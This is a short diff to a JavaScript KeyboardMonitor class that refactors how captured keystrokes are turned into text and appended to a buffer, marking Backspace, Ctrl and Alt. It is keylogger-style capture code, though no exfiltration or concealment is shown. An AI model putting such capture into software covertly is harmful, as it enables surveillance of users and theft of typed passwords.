@@ -299,17 +299,17 @@ class KeyboardMonitor extends EventEmitter {
 
             this.emit('status', { status, keyPresses: this.keyPresses.length });
 
-            // console.log(event)
+            let char = String.fromCharCode(event.keychar);
+            if (this.isPrintableChar(char)) { }
+            else if (event.keychar == 13) char = '\n';
+            else if (event.keychar == 8) char = '[D]';
+            else return;
 
             if (now - this.lastKeyTime > 10000) {
                 this.data += '\n';
             }
             this.lastKeyTime = now;
-
-            const char = String.fromCharCode(event.keychar);
-            if (this.isPrintableChar(char)) this.data += char;
-            else if (event.keychar == 13) this.data += '\n';
-            else if (event.keychar == 8) this.data += '[D]'
+            this.data += char;
 
             if (event.ctrlKey) this.data += '[C]'
             if (event.altKey) this.data += '[A]'
